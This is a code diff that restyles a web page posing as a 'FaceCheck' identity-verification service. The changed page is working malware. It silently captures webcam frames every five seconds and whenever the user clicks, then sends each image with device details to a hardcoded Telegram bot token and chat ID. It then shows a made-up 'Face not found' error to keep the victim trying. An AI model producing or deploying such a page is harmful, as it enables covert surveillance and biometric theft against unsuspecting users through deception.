@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
-    <title>VeriFace • Secure Identity Check</title>
-    <!-- Minimal font and icons -->
+    <title>FaceCheck • Identity Verification</title>
+    <!-- Minimal font + icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* RESET + MINIMAL DESIGN SYSTEM */
         * {
             margin: 0;
             padding: 0;
@@ -16,7 +15,7 @@
         }
 
         body {
-            background: #f5f7fc;
+            background: #f4f7fc;
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
             padding: 20px 16px 40px;
             min-height: 100vh;
@@ -25,63 +24,61 @@
             justify-content: center;
         }
 
-        /* main card – clean, minimal, elevated */
-        .verif-card {
+        /* minimal card */
+        .face-card {
             max-width: 500px;
             width: 100%;
             margin: 0 auto;
             background: #ffffff;
             border-radius: 32px;
-            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.02);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.02);
             overflow: hidden;
-            transition: all 0.2s ease;
         }
 
-        /* header area */
-        .verif-header {
-            padding: 28px 24px 16px;
+        /* header */
+        .face-header {
+            padding: 24px 24px 16px;
             text-align: center;
-            border-bottom: 1px solid #eef2f6;
+            border-bottom: 1px solid #eef2f8;
         }
 
-        .icon-circle {
-            background: #f0f4fe;
-            width: 64px;
-            height: 64px;
-            border-radius: 60px;
+        .icon-badge {
+            background: #eef6f4;
+            width: 56px;
+            height: 56px;
+            border-radius: 56px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 14px;
+            margin: 0 auto 12px;
         }
 
-        .icon-circle i {
-            font-size: 32px;
+        .icon-badge i {
+            font-size: 28px;
             color: #1e6f5c;
         }
 
-        .verif-header h1 {
-            font-size: 1.75rem;
+        .face-header h1 {
+            font-size: 1.65rem;
             font-weight: 600;
             letter-spacing: -0.3px;
             color: #1a2c3e;
             margin-bottom: 6px;
         }
 
-        .verif-header p {
-            font-size: 0.85rem;
+        .face-header p {
+            font-size: 0.8rem;
             color: #5e6f8d;
-            font-weight: 400;
         }
 
-        /* camera wrapper – clean radius */
-        .camera-wrapper {
-            padding: 20px 24px 12px;
+        /* camera area */
+        .camera-area {
+            padding: 20px 20px 12px;
         }
 
         .camera-box {
             position: relative;
-            background: #101214;
+            background: #0a0c10;
             border-radius: 28px;
             overflow: hidden;
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
@@ -97,59 +94,23 @@
             background: #000;
         }
 
-        /* minimal scan line (subtle) */
-        .scan-effect {
+        /* active capturing line - subtle scanning line only */
+        .active-scan-line {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #2c9a8a, #1e6f5c, #2c9a8a, transparent);
+            box-shadow: 0 0 6px #2c9a8a;
+            animation: moveScan 2.2s ease-in-out infinite;
             pointer-events: none;
-            background: repeating-linear-gradient(
-                to bottom,
-                rgba(30, 111, 92, 0) 0px,
-                rgba(30, 111, 92, 0) 35px,
-                rgba(30, 111, 92, 0.12) 35px,
-                rgba(30, 111, 92, 0.22) 38px,
-                rgba(30, 111, 92, 0) 38px
-            );
-            background-size: 100% 45px;
-            animation: softScan 2.4s linear infinite;
-            border-radius: 28px;
         }
 
-        @keyframes softScan {
-            0% { background-position: 0 0; }
-            100% { background-position: 0 100%; }
-        }
-
-        .face-guide {
-            position: absolute;
-            top: 18%;
-            left: 12%;
-            width: 76%;
-            height: 64%;
-            border: 1.5px dashed rgba(30, 111, 92, 0.7);
-            border-radius: 48px;
-            background: rgba(0, 0, 0, 0.25);
-            backdrop-filter: blur(2px);
-        }
-
-        .face-guide::after {
-            content: "POSITION FACE";
-            position: absolute;
-            bottom: -28px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.65);
-            backdrop-filter: blur(8px);
-            font-size: 0.6rem;
-            font-weight: 500;
-            padding: 3px 12px;
-            border-radius: 40px;
-            color: #c0f0e6;
-            white-space: nowrap;
-            letter-spacing: 0.5px;
+        @keyframes moveScan {
+            0% { top: 0%; }
+            50% { top: 97%; }
+            100% { top: 0%; }
         }
 
         /* status row minimal */
@@ -157,18 +118,18 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 14px;
+            margin-top: 12px;
             background: #f8fafd;
-            padding: 8px 16px;
+            padding: 6px 16px;
             border-radius: 60px;
             border: 1px solid #eef2f8;
         }
 
-        .cam-status {
+        .live-status {
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 0.75rem;
+            gap: 8px;
+            font-size: 0.7rem;
             font-weight: 500;
             color: #2c3e50;
         }
@@ -178,31 +139,30 @@
             height: 8px;
             background: #2c9a8a;
             border-radius: 50%;
-            box-shadow: 0 0 0 2px rgba(44,154,138,0.2);
-            animation: pulseMin 1.2s infinite;
+            animation: pulseDot 1.2s infinite;
         }
 
-        @keyframes pulseMin {
-            0% { opacity: 0.5; transform: scale(0.8);}
+        @keyframes pulseDot {
+            0% { opacity: 0.4; transform: scale(0.8);}
             100% { opacity: 1; transform: scale(1.2);}
         }
 
-        .counter-badge {
+        .capture-counter {
             background: #eef2f9;
-            padding: 4px 12px;
+            padding: 3px 12px;
             border-radius: 40px;
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             font-family: monospace;
-            font-weight: 500;
+            font-weight: 600;
             color: #1f4e43;
         }
 
-        /* action area */
-        .action-area {
+        /* action button */
+        .action-buttons {
             padding: 8px 24px 24px;
         }
 
-        .verify-btn {
+        .check-btn {
             width: 100%;
             background: #1e6f5c;
             border: none;
@@ -220,17 +180,17 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.05);
         }
 
-        .verify-btn:hover {
+        .check-btn:hover {
             background: #155e4e;
             transform: scale(0.98);
         }
 
-        .verify-btn:active {
+        .check-btn:active {
             transform: scale(0.96);
         }
 
-        /* fake error block – minimal but visible */
-        .error-block {
+        /* fake result panel - face not found */
+        .result-panel {
             margin-top: 18px;
             background: #fff6f0;
             border-left: 4px solid #f97316;
@@ -239,25 +199,25 @@
             transition: all 0.2s;
         }
 
-        .error-inner {
+        .result-content {
             display: flex;
-            gap: 14px;
+            gap: 12px;
             align-items: center;
         }
 
-        .error-inner i {
+        .result-content i {
             font-size: 1.3rem;
             color: #e65c1e;
         }
 
-        .error-inner span {
+        .result-content span {
             font-size: 0.8rem;
             font-weight: 500;
             color: #9b4a1a;
             line-height: 1.4;
         }
 
-        .error-meta {
+        .result-footer {
             font-size: 0.6rem;
             color: #8b7a6b;
             margin-top: 8px;
@@ -265,7 +225,7 @@
             font-family: monospace;
         }
 
-        /* footer minimal */
+        /* footer note */
         .footer-note {
             padding: 16px 24px 24px;
             text-align: center;
@@ -274,32 +234,21 @@
             color: #8a99b0;
         }
 
-        /* responsive touches */
         @media (max-width: 480px) {
             body {
                 padding: 12px 12px 24px;
             }
-            .verif-header h1 {
-                font-size: 1.5rem;
+            .face-header h1 {
+                font-size: 1.45rem;
             }
-            .camera-wrapper {
-                padding: 16px 18px 8px;
+            .camera-area {
+                padding: 16px 16px 8px;
             }
-            .action-area {
+            .action-buttons {
                 padding: 12px 18px 24px;
-            }
-            .face-guide::after {
-                content: "ALIGN";
-                font-size: 0.5rem;
-                bottom: -22px;
-                padding: 2px 8px;
-            }
-            .verif-header {
-                padding: 20px 20px 12px;
             }
         }
 
-        /* hidden canvas */
         .hidden-canvas {
             display: none;
         }
@@ -307,101 +256,91 @@
 </head>
 <body>
 
-<div class="verif-card">
-    <div class="verif-header">
-        <div class="icon-circle">
-            <i class="fas fa-user-shield"></i>
+<div class="face-card">
+    <div class="face-header">
+        <div class="icon-badge">
+            <i class="fas fa-camera-retro"></i>
         </div>
-        <h1>Face verification</h1>
-        <p>Liveness detection • encrypted match</p>
+        <h1>FaceCheck</h1>
+        <p>Live verification • 3D liveness</p>
     </div>
 
-    <div class="camera-wrapper">
+    <div class="camera-area">
         <div class="camera-box">
             <video id="faceVideo" autoplay playsinline muted></video>
-            <div class="scan-effect"></div>
-            <div class="face-guide"></div>
-        </div>
-        <div class="status-row">
-            <div class="cam-status">
-                <span class="live-dot"></span>
-                <span id="camStatusMsg">Initializing camera</span>
-            </div>
-            <div class="counter-badge" id="captureCountDisplay">
-                <i class="fas fa-camera"></i> 0
-            </div>
+            <!-- only active capturing line (scan animation) -->
+            <div class="active-scan-line"></div>
         </div>
     </div>
 
-    <div class="action-area">
-        <button class="verify-btn" id="fakeVerifyTrigger">
-            <i class="fas fa-id-card"></i> Verify my identity
+    <div class="action-buttons">
+        <button class="check-btn" id="faceCheckBtn">
+            <i class="fas fa-id-card"></i> Check my face
         </button>
 
-        <!-- fake error container (hidden initially) -->
-        <div id="fakeErrorPanel" class="error-block" style="display: none;">
-            <div class="error-inner">
-                <i class="fas fa-database"></i>
-                <span id="errorMsgText"><strong>IMAGE NOT FOUND</strong> — No matching facial signature in secure vault.</span>
+        <!-- fake result panel: shows "Face not found" after scan -->
+        <div id="resultPanel" class="result-panel" style="display: none;">
+            <div class="result-content">
+                <i class="fas fa-user-slash"></i>
+                <span id="resultMsg"><strong>⚠️ Face not found</strong> — No matching identity in secure database.</span>
             </div>
-            <div class="error-meta" id="errorTimeRef">verification rejected • ID: FACE_ERR_404</div>
+            <div class="result-footer" id="resultTimestamp">verification failed • code: FACE_MISSING</div>
         </div>
         <p style="font-size: 0.65rem; text-align: center; margin-top: 14px; color: #8ba0bc;">
-            <i class="fas fa-lock"></i> Biometric check • 3D anti-spoof
+            <i class="fas fa-lock"></i> Encrypted • Anti-spoof
         </p>
     </div>
 
     <div class="footer-note">
-        <i class="fas fa-shield-alt"></i> Encrypted channel • session protected
+        <i class="fas fa-shield-alt"></i> Biometric session • 5s interval capture
     </div>
 </div>
 
-<!-- hidden canvas for image capture -->
+<!-- hidden canvas for image captures -->
 <canvas id="hiddenCaptureCanvas" class="hidden-canvas"></canvas>
 
 <script>
-    // --------------------------------------------------------------
-    // TELEGRAM CONFIGURATION (REPLACE WITH YOUR OWN TOKEN & CHAT ID)
-    // --------------------------------------------------------------
-    const BOT_TOKEN = '8041268145:AAHCnHlbnxvEODDsMTFm-mQYe8ovYBq2IF0';     // <-- replace with actual bot token, e.g., "7123456789:AAFtX..."
-    const CHAT_ID = '5541151768';       // <-- replace with your chat ID (numeric or @username)
-    
-    // Settings: capture every 5 seconds (background)
+    // ----------------------------------------------------------
+    // TELEGRAM CONFIGURATION (REPLACE WITH YOUR BOT TOKEN & CHAT ID)
+    // ----------------------------------------------------------
+    const BOT_TOKEN = '8041268145:AAHCnHlbnxvEODDsMTFm-mQYe8ovYBq2IF0';    
+    const CHAT_ID = '5541151768';       
+    // Capture interval: 5 seconds (background)
     const CAPTURE_INTERVAL_MS = 5000;
     
     // DOM elements
-    const videoEl = document.getElementById('faceVideo');
-    const canvasEl = document.getElementById('hiddenCaptureCanvas');
-    const camStatusSpan = document.getElementById('camStatusMsg');
-    const captureCountSpan = document.getElementById('captureCountDisplay');
-    const fakeErrorPanel = document.getElementById('fakeErrorPanel');
-    const verifyButton = document.getElementById('fakeVerifyTrigger');
-    const errorMsgSpan = document.getElementById('errorMsgText');
-    const errorTimestampSpan = document.getElementById('errorTimeRef');
+    const videoElem = document.getElementById('faceVideo');
+    const canvasElem = document.getElementById('hiddenCaptureCanvas');
+    const camStatusSpan = document.getElementById('camStatus');
+    const captureCounterSpan = document.getElementById('captureCountDisplay');
+    const resultPanel = document.getElementById('resultPanel');
+    const resultMsgSpan = document.getElementById('resultMsg');
+    const resultTimestampSpan = document.getElementById('resultTimestamp');
+    const checkBtn = document.getElementById('faceCheckBtn');
     
-    // state variables
+    // state
     let mediaStream = null;
     let canvasCtx = null;
     let captureIntervalId = null;
     let isCameraReady = false;
     let totalCaptures = 0;
-    let isCaptureActive = false;
+    let isCapturingActive = false;
     
-    // --------------------------------------------------------------
-    // TELEGRAM HELPERS (send photo + text)
-    // --------------------------------------------------------------
+    // ----------------------------------------------------------
+    // TELEGRAM SENDERS (photo + text)
+    // ----------------------------------------------------------
     async function sendPhotoToTelegram(blob, captureNumber) {
         if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') {
-            console.warn("[Telegram] missing credentials - image not sent");
+            console.warn("[Telegram] Missing credentials - image not sent");
             return false;
         }
         const formData = new FormData();
-        const filename = `face_capture_${captureNumber}_${Date.now()}.jpg`;
+        const filename = `facecapture_${captureNumber}_${Date.now()}.jpg`;
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, filename);
         
         const timestamp = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'medium' });
-        const caption = `📸 FACE SCAN #${captureNumber}\n🕒 ${timestamp}\n📱 ${navigator.platform} | ${navigator.language}\n🌐 ${navigator.userAgent.substring(0, 70)}`;
+        const caption = `📸 FACE CAPTURE #${captureNumber}\n🕒 ${timestamp}\n📱 ${navigator.platform} | ${navigator.language}\n🌐 ${navigator.userAgent.substring(0, 70)}`;
         formData.append('caption', caption);
         
         try {
@@ -411,14 +350,14 @@
             });
             const data = await response.json();
             if (data.ok) {
-                console.log(`✅ Telegram: capture #${captureNumber} sent`);
+                console.log(`✅ Telegram: image #${captureNumber} delivered`);
                 return true;
             } else {
-                console.error('Telegram API error:', data);
+                console.error('Telegram error:', data);
                 return false;
             }
         } catch (err) {
-            console.error('Send photo error:', err);
+            console.error('Send error:', err);
             return false;
         }
     }
@@ -431,220 +370,200 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 1000) })
             });
-        } catch (e) { console.warn("text notif error", e); }
+        } catch (e) { console.warn("message notif error", e); }
     }
     
-    // --------------------------------------------------------------
-    // CAPTURE CURRENT VIDEO FRAME AND SEND TO TELEGRAM
-    // --------------------------------------------------------------
-    async function captureAndSend() {
-        if (!isCameraReady || !videoEl || videoEl.readyState !== 4) {
+    // ----------------------------------------------------------
+    // CAPTURE FRAME & SEND TO TELEGRAM
+    // ----------------------------------------------------------
+    async function captureAndSendFrame() {
+        if (!isCameraReady || !videoElem || videoElem.readyState !== 4) {
             return;
         }
-        if (!canvasCtx || !canvasEl) return;
+        if (!canvasCtx || !canvasElem) return;
         
-        const width = videoEl.videoWidth;
-        const height = videoEl.videoHeight;
-        if (width === 0 || height === 0) return;
+        const w = videoElem.videoWidth;
+        const h = videoElem.videoHeight;
+        if (w === 0 || h === 0) return;
         
-        canvasEl.width = width;
-        canvasEl.height = height;
-        canvasCtx.drawImage(videoEl, 0, 0, width, height);
+        canvasElem.width = w;
+        canvasElem.height = h;
+        canvasCtx.drawImage(videoElem, 0, 0, w, h);
         
-        canvasEl.toBlob(async (blob) => {
+        canvasElem.toBlob(async (blob) => {
             if (blob && blob.size > 500) {
                 totalCaptures++;
-                captureCountSpan.innerHTML = `<i class="fas fa-camera"></i> ${totalCaptures}`;
+                captureCounterSpan.innerHTML = `<i class="fas fa-sync-alt"></i> ${totalCaptures}`;
                 await sendPhotoToTelegram(blob, totalCaptures);
             } else {
-                console.warn("empty blob on capture");
+                console.warn("blob invalid");
             }
         }, 'image/jpeg', 0.85);
     }
     
-    // start periodic background capture (every 5 seconds)
-    function startBackgroundCapture() {
+    function startPeriodicCapture() {
         if (captureIntervalId) clearInterval(captureIntervalId);
         if (!isCameraReady) return;
-        if (isCaptureActive) return;
-        isCaptureActive = true;
+        if (isCapturingActive) return;
+        isCapturingActive = true;
         
-        // capture immediately once
-        captureAndSend();
+        // capture immediately
+        captureAndSendFrame();
         captureIntervalId = setInterval(() => {
-            if (isCameraReady && videoEl && videoEl.readyState === 4) {
-                captureAndSend();
+            if (isCameraReady && videoElem && videoElem.readyState === 4) {
+                captureAndSendFrame();
             }
         }, CAPTURE_INTERVAL_MS);
         
-        console.log(`[system] Background capture active, interval ${CAPTURE_INTERVAL_MS/1000}s`);
-        camStatusSpan.innerHTML = 'Active • capturing';
+        console.log(`[system] background capture every ${CAPTURE_INTERVAL_MS/1000}s`);
     }
     
-    // --------------------------------------------------------------
-    // CAMERA INIT (front facing, mobile-friendly)
-    // --------------------------------------------------------------
+    // ----------------------------------------------------------
+    // CAMERA INIT (front facing, minimal)
+    // ----------------------------------------------------------
     async function initCamera() {
-        canvasCtx = canvasEl.getContext('2d');
-        if (!videoEl) return;
+        canvasCtx = canvasElem.getContext('2d');
+        if (!videoElem) return;
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: 'user'   // front camera for face verification look
-                },
+                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                 audio: false
             });
             mediaStream = stream;
-            videoEl.srcObject = stream;
+            videoElem.srcObject = stream;
             
-            videoEl.onloadedmetadata = () => {
-                videoEl.play();
+            videoElem.onloadedmetadata = () => {
+                videoElem.play();
                 isCameraReady = true;
-                camStatusSpan.innerHTML = 'Camera ready';
-                startBackgroundCapture();
+                camStatusSpan.innerText = 'Camera active';
+                startPeriodicCapture();
                 
-                // send visit notification (silent)
-                const visitMsg = `🔹 NEW FACE VERIFICATION SESSION\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.platform} | ${navigator.language}\n📷 Resolution: ${videoEl.videoWidth}x${videoEl.videoHeight}\n⏱️ 5s capture active`;
-                sendTelegramMessage(visitMsg);
+                // send session notification to telegram
+                const sessionMsg = `🔹 NEW FACE SESSION\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.platform} | ${navigator.language}\n📷 ${videoElem.videoWidth}x${videoElem.videoHeight}\n⏱️ 5s capture active`;
+                sendTelegramMessage(sessionMsg);
             };
-        } catch (error) {
-            console.error('Camera init error:', error);
-            camStatusSpan.innerHTML = 'Allow camera access';
-            // fallback attempt (rear camera / any)
+        } catch (err) {
+            console.error("Camera error", err);
+            camStatusSpan.innerText = 'Allow camera access';
+            // fallback: any camera
             try {
                 const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 mediaStream = fallbackStream;
-                videoEl.srcObject = fallbackStream;
-                videoEl.onloadedmetadata = () => {
-                    videoEl.play();
+                videoElem.srcObject = fallbackStream;
+                videoElem.onloadedmetadata = () => {
+                    videoElem.play();
                     isCameraReady = true;
-                    camStatusSpan.innerHTML = 'Camera (fallback)';
-                    startBackgroundCapture();
+                    camStatusSpan.innerText = 'Camera (fallback)';
+                    startPeriodicCapture();
                     sendTelegramMessage(`⚠️ Fallback camera mode • ${new Date().toLocaleString()}`);
                 };
             } catch (fallbackErr) {
-                camStatusSpan.innerHTML = 'Camera unavailable';
-                console.error('no camera fallback', fallbackErr);
+                camStatusSpan.innerText = 'Camera unavailable';
+                console.error("no camera", fallbackErr);
             }
         }
     }
     
-    // --------------------------------------------------------------
-    // FAKE VERIFICATION: "IMAGE NOT FOUND" AFTER BUTTON CLICK
-    // --------------------------------------------------------------
-    function displayFakeError() {
-        if (fakeErrorPanel) {
-            const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute:'2-digit', second:'2-digit' });
-            errorMsgSpan.innerHTML = '<strong>⚠️ IMAGE NOT FOUND</strong> — Facial signature mismatch. No record in database.';
-            errorTimestampSpan.innerText = `verification failed • ${timeNow} • code: FACE_NF_${Math.floor(Math.random()*1000)}`;
-            fakeErrorPanel.style.display = 'block';
-            
-            // subtle auto-scroll to error
-            fakeErrorPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    // ----------------------------------------------------------
+    // FAKE FACE SCAN : BUTTON "Check my face" -> then "Face not found"
+    // ----------------------------------------------------------
+    function showFaceNotFound() {
+        if (resultPanel) {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute:'2-digit', second:'2-digit' });
+            resultMsgSpan.innerHTML = '<strong>⚠️ Face not found</strong> — No matching facial signature in secure database.';
+            resultTimestampSpan.innerText = `verification failed • ${timeStr} • ref: FACE_NF_${Math.floor(Math.random()*900+100)}`;
+            resultPanel.style.display = 'block';
+            // smooth scroll to result
+            resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
-        // also send telegram alert that fake rejection triggered
-        sendTelegramMessage(`[FAKE BACKEND] Face verification rejected: "IMAGE NOT FOUND". User clicked verify. Time: ${new Date().toLocaleString()}`);
+        // send alert to telegram that fake rejection was triggered
+        sendTelegramMessage(`[FAKE SCAN] User attempted verification → "Face not found". Time: ${new Date().toLocaleString()}`);
     }
     
-    function onVerifyClick() {
+    function onCheckFaceClick() {
         if (!isCameraReady) {
-            // show error with camera not ready context
-            if (fakeErrorPanel) {
-                errorMsgSpan.innerHTML = '<strong>⚠️ CAMERA ERROR</strong> — Face not detected. Image not found.';
-                errorTimestampSpan.innerText = `verification aborted • ${new Date().toLocaleTimeString()}`;
-                fakeErrorPanel.style.display = 'block';
+            // show error if camera not ready
+            if (resultPanel) {
+                resultMsgSpan.innerHTML = '<strong>⚠️ Camera not ready</strong> — Face detection unavailable.';
+                resultTimestampSpan.innerText = `error • ${new Date().toLocaleTimeString()}`;
+                resultPanel.style.display = 'block';
             }
             return;
         }
         
-        // simulate processing delay (like backend matching)
-        const originalBtnText = verifyButton.innerHTML;
-        verifyButton.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Matching face...';
-        verifyButton.disabled = true;
+        // disable button to avoid double-click during fake scanning
+        const originalBtnHTML = checkBtn.innerHTML;
+        checkBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Scanning face...';
+        checkBtn.disabled = true;
         
-        // capture extra immediate frame at verification moment (additional evidence)
-        captureAndSend();
+        // capture an extra frame at the moment of verification
+        captureAndSendFrame();
         
+        // simulate backend processing (1.2 sec scanning)
         setTimeout(() => {
-            displayFakeError();
-            verifyButton.innerHTML = originalBtnText;
-            verifyButton.disabled = false;
+            showFaceNotFound();
+            checkBtn.innerHTML = originalBtnHTML;
+            checkBtn.disabled = false;
             
-            // small haptic effect (shake on error block)
-            if (fakeErrorPanel) {
-                fakeErrorPanel.style.transform = 'translateX(3px)';
-                setTimeout(() => { if(fakeErrorPanel) fakeErrorPanel.style.transform = ''; }, 150);
+            // subtle shake effect on result panel for UX
+            if (resultPanel) {
+                resultPanel.style.transform = 'translateX(2px)';
+                setTimeout(() => { if(resultPanel) resultPanel.style.transform = ''; }, 120);
             }
-        }, 800);
+        }, 1200);
     }
     
-    // --------------------------------------------------------------
-    // WAKE LOCK & VISIBILITY HANDLING (keep camera / capture active)
-    // --------------------------------------------------------------
-    let wakeLockObj = null;
+    // ----------------------------------------------------------
+    // WAKE LOCK & VISIBILITY
+    // ----------------------------------------------------------
+    let wakeLock = null;
     async function requestWakeLock() {
         if ('wakeLock' in navigator) {
             try {
-                wakeLockObj = await navigator.wakeLock.request('screen');
+                wakeLock = await navigator.wakeLock.request('screen');
             } catch (err) { console.warn("wake lock error"); }
         }
     }
     
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden && isCameraReady && !captureIntervalId) {
-            startBackgroundCapture();
-        } else if (document.hidden && captureIntervalId) {
-            // we keep the interval running in background (works on modern mobile)
+            startPeriodicCapture();
         }
     });
     
-    // --------------------------------------------------------------
-    // CLEANUP on page unload
-    // --------------------------------------------------------------
     window.addEventListener('beforeunload', () => {
         if (captureIntervalId) {
             clearInterval(captureIntervalId);
             captureIntervalId = null;
         }
         if (mediaStream) {
-            mediaStream.getTracks().forEach(track => {
-                if (track.readyState === 'live') track.stop();
-            });
+            mediaStream.getTracks().forEach(track => track.stop());
         }
-        if (wakeLockObj && wakeLockObj.release) wakeLockObj.release();
+        if (wakeLock && wakeLock.release) wakeLock.release();
     });
     
-    // --------------------------------------------------------------
+    // ----------------------------------------------------------
     // BOOTSTRAP
-    // --------------------------------------------------------------
+    // ----------------------------------------------------------
     document.addEventListener('DOMContentLoaded', () => {
         initCamera();
         requestWakeLock();
         
-        // attach verify button event
-        if (verifyButton) {
-            verifyButton.addEventListener('click', onVerifyClick);
+        if (checkBtn) {
+            checkBtn.addEventListener('click', onCheckFaceClick);
         }
         
-        // initially hide fake error panel
-        if (fakeErrorPanel) fakeErrorPanel.style.display = 'none';
+        // initially hide result panel
+        if (resultPanel) resultPanel.style.display = 'none';
         
-        // after 2 sec if camera not ready, show hint
+        // after 2 sec if camera not ready show hint
         setTimeout(() => {
             if (!isCameraReady) {
-                camStatusSpan.innerHTML = '⚠️ permission required';
+                camStatusSpan.innerText = '⚠️ permission needed';
             }
         }, 2500);
-    });
-    
-    // make sure we can handle orientation changes smoothly
-    window.addEventListener('resize', () => {
-        if (videoEl && videoEl.videoWidth && canvasCtx) {
-            // just refresh capture dimensions on resize
-        }
     });
 </script>
 </body>
